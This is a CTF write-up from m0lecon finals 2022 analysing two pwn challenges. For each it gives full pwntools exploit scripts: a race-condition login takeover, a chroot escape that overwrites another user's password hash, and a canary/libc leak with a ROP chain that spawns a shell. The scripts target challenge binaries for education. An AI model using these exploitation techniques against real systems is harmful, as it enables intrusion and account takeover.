---
title: "m0lecon finals 2022"
date: "2022-11-18"
tags: ["CTF", "m0lecon", "finals", "AttackDefence"]
---

# Attack Defence

## Shellcode storage ([kalex](/authors/kalex))
This was a pwn challenge. The binary is available [here](/downloadables/m0lecon_finals_2022_s3). We could not find the vulnerability in time during the CTF, but it featured a very nice (and ~~potentially~~ destructive) unintended solution which I wanted to cover.

### Exploration
The decompiled binary is pretty easy, with a couple of interesting points:
- The binary uses a password file and locks on it to store users' passwords. This prevents concurrent sessions to overwrite the passwords.
- To execute the shellcode stored by users, the binary spawns a child process which executes the following actions:
  - set some signal handlers
  - chroot into the user directory
  - install a seccomp
  - execute the shellcode

  The seccomp (obtained with `seccomp-tools`) is the following:
  ```c
  line  CODE  JT   JF      K
  =================================
   0000: 0x20 0x00 0x00 0x00000004  A = arch
   0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
   0002: 0x06 0x00 0x00 0x00000000  return KILL
   0003: 0x20 0x00 0x00 0x00000000  A = sys_number
   0004: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0006
   0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008
   0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0008: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0010
   0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0010: 0x15 0x00 0x01 0x00000008  if (A != lseek) goto 0012
   0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0012: 0x15 0x00 0x01 0x00000004  if (A != stat) goto 0014
   0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0014: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0016
   0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0016: 0x15 0x00 0x01 0x00000006  if (A != lstat) goto 0018
   0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0018: 0x15 0x00 0x01 0x00000027  if (A != getpid) goto 0020
   0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0020: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0022
   0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0022: 0x15 0x00 0x01 0x00000023  if (A != nanosleep) goto 0024
   0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0024: 0x15 0x00 0x01 0x00000050  if (A != chdir) goto 0026
   0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0026: 0x15 0x00 0x03 0x00000001  if (A != write) goto 0030
   0027: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
   0028: 0x35 0x01 0x00 0x00000003  if (A >= 0x3) goto 0030
   0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0030: 0x06 0x00 0x00 0x00000000  return KILL
  ```

### The intended solution
Looking at the binary, we can find out that the parent process does not `wait` for the children to end, it just `sleep`s for 5 seconds. We can also notice that there is the possibility of logging out (which is usually present in most binaries in the CTFs, but it is rarely useful).

If we put this all together with the fact that fork uses the same file descriptor for the children and that we have access to `lseek` in the shellcode, we can actually force a race condition to happen and log in with another user ID!

If you look at how the code is written for the login, you can now spot the error in it:
```c
void loginUser(void)

{
  int tmp;
  int __fd;
  size_t sVar1;
  long in_FS_OFFSET;
  int id;
  undefined hash_out [32];
  undefined saved_hash [32];
  char password [72];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);

  // Here the ID is taken in
  printf("Please insert your ID: "); 
  __isoc99_fscanf(stdin,"%d",&id);
  getchar();
  tmp = id << 5;
  __fd = fileno(pwdfile);

  // and the file descriptor of the passwords file is lseeked
  lseek(__fd,(long)tmp,SEEK_SET); 

  // but here we can wait undefinitely, 
  // for example until the child has lseeked the fd to our ID
  printf("Please insert your password: "); 
  fgets(password,0x3f,stdin);
  sVar1 = strcspn(password,"\n");
  password[sVar1] = '\0';
  sVar1 = strlen(password);
  sha256(password,sVar1 & 0xffffffff,hash_out);
  tmp = fileno(pwdfile);
  read(tmp,saved_hash,0x20);
  tmp = memcmp(hash_out,saved_hash,0x20);
  if (tmp == 0) {
    userHandler(id);
  }
  else {
    puts("Wrong password!");
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

The attack can be implemented as following:
```py
#!/usr/bin/env python3

from pwn import *
from hashlib import sha256
from base64 import b64encode
import time
import os

exe = ELF("./s3")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]
io = None


def conn(*a, **kw):
    if args.LOCAL:
        return process([exe.path], **kw)
    else:
        return gdb.debug([exe.path], gdbscript="", **kw)


io = conn(level="debug")


def register(pwd: bytes) -> int:
    global io
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"password: ", pwd)
    io.recvuntil(b"Your user's ID is: ")
    return int(io.recvline()[:-1])


def login(idx: int, pwd: bytes, sleep=0):
    global io
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"ID: ", str(idx).encode())

    time.sleep(sleep)
    io.sendlineafter(b"password: ", pwd)


def run_shellcode(shellcode: bytes):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"shellcode!\n", shellcode)


def logout():
    global io
    io.sendlineafter(b"> ", b"6")


def main():
    global io

    to_pwn = 0

    # good luck pwning :)
    mypwd = os.urandom(16).hex().encode()  # random password
    idx = register(mypwd)  # register our user
    login(idx, mypwd)  # login

    shellcode = b64encode(
        asm(
            "push 0\n"  # nanoseconds
            + "push 6\n"  # seconds
            + "mov rdi, rsp\n"  # 1st argument for nanosleep
            + "xor rsi, rsi\n"  # 2nd argument can be NULL
            + f"mov rax, {constants.SYS_nanosleep}\n"
            + "syscall\n"
            + shellcraft.lseek(3, idx * (256 // 8), constants.SEEK_SET)
        )
    )
    run_shellcode(shellcode)  # run our shellcode
    logout()
    login(to_pwn, mypwd, sleep=2)  # sleep before sending the password

    io.interactive()


if __name__ == "__main__":
    main()

```

### The (probably?) unintended solution
Remember what we said earlier? The child process calls `chroot` with the directory of our user (`data/N`, with N the user ID). By reading the `chroot` manual carefully, we can notice that there is a slight problem: this `chroot` is completely useless. The manual explains that:
> This  call  does  not  change the current working directory, so that after the call '.' can be outside the tree rooted at '/'.

It is possible to confirm this by writing a simple C program to try to `chroot` inside a directory without calling `chdir` into it. You will notice that the `pwd` does not change, nor the process is really inside the `chroot`.

We can abuse this to modify the password file! In particular, we write to our target a sha256 password of our choice.

Here's the script that implements the attack (functions and utils are defined as above):
```py
def main():
    global io

    pwned_pwd = os.urandom(16).hex().encode()  # random password
    to_pwn = 0

    # good luck pwning :)
    mypwd = os.urandom(16).hex().encode()
    idx = register(mypwd)
    login(idx, mypwd)

    shellcode = b64encode(
        asm(
            # rax contains the address of our shellcode page,
            # which we can use for writing stuff easily
            "push rax\n"
            # we save it in r15 for future usage, with an
            # offset to make sure we don't overwrite our shellcode
            + "pop r15\n"
            + "add r15, 0x300\n"
            # we cannot write to fd >= 3 due to seccomp,
            # therefore we close stderr and reopen passwords,
            # which will now have fd = 2 on most systems
            + shellcraft.close(2)
            + shellcraft.open("./passwords", constants.O_WRONLY)
            # Reading out the sha256 of the password is optional,
            # but not doing so would make it impossible
            # to restore it later. If not restored the service
            # of every other players would appear as down, as
            # the bot is not able to login anymore
            + shellcraft.lseek(2, to_pwn * (256 // 8), constants.SEEK_SET)
            + shellcraft.read(2, "r15", 256 // 8)
            + shellcraft.write(1, "r15", 256 // 8)
            # Finally, we overwrite the password sha256 with our password sha256!
            + shellcraft.lseek(2, to_pwn * (256 // 8), constants.SEEK_SET)
            + shellcraft.write(
                2,
                sha256(pwned_pwd).digest(),
                256 // 8,
            )
        )
    )

    run_shellcode(shellcode)
    logout()
    login(to_pwn, pwned_pwd)
    # steal flag here :)
    # after that, execute one more time the above shellcode, 
    # but now we restore the original sha256 password

    io.interactive()
```

### Summary
Very nice challenge, learnt the hard way around that `wait`ing a child to exit is more important than it may look at first sight, and that `chroot`s are really strange sometimes. Do not trust 'em!

# Speedruns
The CTF featured a number of four speedrun challenges, which were Jeopardy-style challenges released every 2 hours. Unfortunately, we only solved the second one, but we got really close to solve the first one too!

Unfortunately, as the first one was related to making a scanner (which was on-site) scan an image, we cannot really try to solve it afterward the CTF ended 😔.

## VFS - Speedrun 2 ([kalex](/authors/kalex))

### Exploration
This pwn challenge was pretty interesting, as it was illustrating how it is (kinda) possible to use the stack to allocate memory dynamically (spoiler alert: don't ***ever*** do it for real). The binary and other files that came with it are available [here](/downloadables/m0lecon_finals_2022_vfs.zip).

The binaries' protections are the following (checksec output):
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The binary was fairly simple. The decompiled version from [Ghidra](https://ghidra-sre.org/) is the following:

```c
// This is actually not as complex as it looks, but as this
// function does not follow the normal calling convention and
// stack setup, Ghidra doesn't really understand what's going
// on really well
void demo(long size)
{
  long in_FS_OFFSET;
  long canary;
  long -size;
  
  -size = -size;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Please insert your string!");
  printf("> ");
  gets(&stack0x00000000 + -size);
  *(undefined *)((long)&canary + *(long *)(&stack0xfffffffffffffff8 + -size) + -size) = 0;
  print_result((long)&stack0x00000000 + -size);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void VFS(void)
{
  long in_FS_OFFSET;
  long size;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("How big of an array you want to make?");
  printf("> ");
  size = -1;
  __isoc99_scanf("%lu",&size);
  getchar();
  if ((size < 1) || (0x1ff < size)) {
    puts("Let\'s not break our necks here...");
  }
  else {
    size = (size - size % 0x10) + 0x20;
    demo(size);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void stats(void)
{
  int choice;
  long in_FS_OFFSET;
  undefined8 rating;
  char local_178 [360];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Hello! This demo was proven faster than mallocs, in every test environment available.");
  puts("90% of the developers who used this app found this approach more useful than mallocs");
  puts("Our company found a 60% revenue increase after switching all our products to VSF");
  puts("You can get our VSF ready kit for only 13370$");
  puts("Can you please leave a rating? (y/n)");
  printf("> ");
  choice = getchar();
  getchar();
  if ((char)choice == 'y') {
    puts(
        "VFS allows us to have ratings between 0 and 18446744073709551615, unlike mallocs approaches , which is usually limited to 5 (in all testing environments)"
        );
    printf("> ");
    __isoc99_scanf("%lu",&rating);
    getchar();
  }
  else {
    puts("At least leave us a review pls");
    putchar(0x3e);
    fgets(local_178,0x15d,stdin);
  }
  printf("Your rating of %lu was recorded\n",rating);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void main(void)
{
  long in_FS_OFFSET;
  char choice;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setBuffs();
  puts("Welcome to VSF demo!");
  while( true ) {
    puts("Main menu");
    puts("1. Test variable size frames");
    puts("2. Print stats which proves this approach is better than malloc");
    puts("3. Exit");
    printf("> ");
    read(0,&choice,1);
    getchar();
    if (choice == '3') break;
    if (choice == '1') {
      VFS();
    }
    if (choice == '2') {
      stats();
    }
  }
  puts("Hope you enjoyed this demo, and please stop using malloc :)");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

If you are wondering what the `demo` function does, it is useful to look at the assembly. A standard function prologue looks like the following (intel syntax):
```asm
push   rbp
mov    rbp,rsp
sub    rsp,0x180
```
The space allocated on the stack for the local variables (using `sub rsp, <n>`) is statically defined. In `demo`, however, the prologue is the following:
```asm
push   rbp
mov    rbp,rsp
sub    rsp,rdi
```
where the space allocated is dynamically defined using `rdi`, which is the first argument passed to the function.

There are two vulnerabilities. The first one is obvious, and derives from the usage of `gets`. Notice, however, that we cannot leak the canary, as `gets` puts a null byte at the end of our input, preventing string-reading functions to leak it.

The second vulnerability is a little more subtle. Notice that the `rating` variable in `stats` is never initialized if we do not enter the if, but it still gets printed out anyway at the end. This means that we can leak stuff on the stack!

### Exploitation
We can use the second vulnerability to leak stuff from the binary. The easier way to see what we can get is to try every possible combination of calls to `VFS`, followed by a `stats`. In each `VFS` call, we will change the size of the stack allocation, therefore changing the stack (and possibly what's leaked by `stats`). 

We can then simply print out the leaks, find out what it prints (in this case, both the canary and a libc address is printed, allowing us to use the whole libc to pop a shell).

We can then simply build a ropchain to pop a shell using a one_gadget (and some gadgets to fulfill its constraints.

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vfs_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]
io = None


def conn(*a, **kw):
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="", **kw)
    else:
        return process([exe.path], **kw)


def vfs(size, data=b"A"):
    global io
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", data)


def stats():
    global io
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"n")
    io.sendlineafter(b">", b"AAAA")
    io.recvuntil(b"rating of ")
    return int(io.recvuntil(" ")[:-1])


def main():
    global io
    io = conn(level="debug")

    # good luck pwning :)
    # Bruteforce the possible leaks
    # for i in range(2, 0x200):
    #     vfs(i)
    #     print(i, hex(stats()))

    # Leak canary
    vfs(288)
    canary = stats()
    log.info(f"canary: {hex(canary)}")

    # Leak libc
    vfs(144)
    libc.address = stats() - 0x216600
    log.success(f"libc @ {hex(libc.address)}")

    # Get a shell
    # To use the one_gadget found, we need to set a couple of registers first

    # 0xebcf8 execve("/bin/sh", rsi, rdx)
    # constraints:
    #   address rbp-0x78 is writable
    #   [rsi] == NULL || rsi == NULL
    #   [rdx] == NULL || rdx == NULL
    rop = ROP(libc)
    rop.raw(libc.address + 0x00000000000DA97D)  # pop rsi; ret;
    rop.raw(0)
    rop.raw(libc.address + 0x000000000011F497)  # pop rdx; pop r12; ret
    rop.raw(0)
    rop.raw(0)
    rop.raw(libc.address + 0xEBCF8)

    payload = flat(
        b"A" * 16,  # padding
        canary,  # canary
        exe.bss(100),  # one_gadget also requires a writeable rbp - 0x78
        rop.chain(),  # rop chain
    )
    vfs(10, payload)

    io.interactive()


if __name__ == "__main__":
    main()
```
